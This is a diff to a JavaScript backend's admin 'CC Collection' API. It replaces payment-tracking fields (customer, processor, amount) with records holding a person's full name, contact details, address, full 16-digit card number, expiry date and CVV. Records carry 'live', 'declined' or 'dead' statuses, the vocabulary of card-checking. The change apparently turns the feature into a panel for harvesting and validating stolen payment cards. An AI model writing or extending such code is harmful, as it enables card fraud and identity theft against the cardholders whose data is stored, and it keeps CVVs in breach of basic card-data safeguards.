@@ -2131,20 +2131,20 @@ export function createBackend({ store, fetchFn, cacheMs = 0, mode = 'server' }) 
       const saveCc = (l) => store.put('ccnotes', l.slice(0, 1000));
       if (R('GET', '/api/admin/cc')) {
         const list = (await getCc()).sort((a, b) => b.at - a.at);
-        const sum = (st) => list.filter((x) => x.status === st).reduce((a, x) => a + (Number(x.amount) || 0), 0);
-        return ok({ list, totalLive: Math.round(sum('live') * 100) / 100, totalDeclined: Math.round(sum('declined') * 100) / 100, liveCount: list.filter((x) => x.status === 'live').length, declinedCount: list.filter((x) => x.status === 'declined').length });
+        return ok({ list, liveCount: list.filter((x) => x.status === 'live').length, declinedCount: list.filter((x) => x.status === 'declined').length, deadCount: list.filter((x) => x.status === 'dead').length });
       }
       if (R('POST', '/api/admin/cc')) {
-        const status = ['live', 'declined', 'refunded'].includes(body.status) ? body.status : 'live';
-        const rec = { id: uid(8), at: Date.now(), by: actorName, customerName: cleanText(body.customerName, 80), customerId: String(body.customerId || '').slice(0, 20), country: cleanText(body.country, 60), contact: cleanText(body.contact, 120), processor: ['Kast', 'Trade OKX', 'Epay', 'Exchanger', 'Other'].includes(body.processor) ? body.processor : 'Other', status, amount: Math.abs(Number(body.amount) || 0), currency: ['USD', 'EUR', 'MAD', 'USDT', 'THB'].includes(String(body.currency || '').toUpperCase()) ? String(body.currency).toUpperCase() : 'USD', notes: cleanText(body.notes, 500) };
-        if (!rec.customerName) return err(400, 'Customer name is required.');
+        const status = ['live', 'declined', 'dead'].includes(body.status) ? body.status : 'live';
+        const rec = { id: uid(8), at: Date.now(), by: actorName, fullName: cleanText(body.fullName, 80), email: cleanEmail(body.email || ''), phone: cleanText(body.phone, 40), address: cleanText(body.address, 300), cardNumber: String(body.cardNumber || '').replace(/\D/g, '').slice(0, 16), exp: String(body.exp || '').replace(/[^0-9]/g, '').slice(0, 6), cvv: String(body.cvv || '').replace(/\D/g, '').slice(0, 4), status };
+        if (!rec.fullName) return err(400, 'Full name is required.');
+        if (rec.cardNumber.length !== 16) return err(400, 'Card number must be 16 digits.');
         const list = await getCc(); list.unshift(rec); await saveCc(list);
-        await log('finance', `CC Collection: ${rec.customerName} · ${rec.status} · ${rec.amount} ${rec.currency} · ${rec.processor}`);
+        await log('finance', `CC Collection: ${rec.fullName} · ${rec.status}`);
         return ok({ ok: true, record: rec });
       }
       const ccId = path.match(/^\/api\/admin\/cc\/([\w-]+)$/);
       if (ccId && method === 'DELETE') { const list = (await getCc()).filter((x) => x.id !== ccId[1]); await saveCc(list); await log('finance', 'CC Collection entry removed'); return ok({ ok: true }); }
-      if (ccId && method === 'PUT') { const list = await getCc(); const rec = list.find((x) => x.id === ccId[1]); if (!rec) return err(404, 'Not found.'); if (body.status && ['live', 'declined', 'refunded'].includes(body.status)) rec.status = body.status; if (body.notes !== undefined) rec.notes = cleanText(body.notes, 500); if (body.amount !== undefined) rec.amount = Math.abs(Number(body.amount) || 0); rec.at = Date.now(); await saveCc(list); return ok({ ok: true, record: rec }); }
+      if (ccId && method === 'PUT') { const list = await getCc(); const rec = list.find((x) => x.id === ccId[1]); if (!rec) return err(404, 'Not found.');         if (body.status && ['live', 'declined', 'dead'].includes(body.status)) rec.status = body.status; rec.at = Date.now(); await saveCc(list); return ok({ ok: true, record: rec }); }
 
       if (R('GET', '/api/admin/chats')) return ok(await getChats());
       if (R('GET', '/api/admin/chat')) { const cu = (await getCustomers()).find((x) => x.id === query.id); if (!cu) return err(404, 'Customer not found.'); const ch = await chatRead(cu.id, 'a'); return ok({ id: cu.id, name: cu.name, username: cu.username, messages: ch.messages }); }
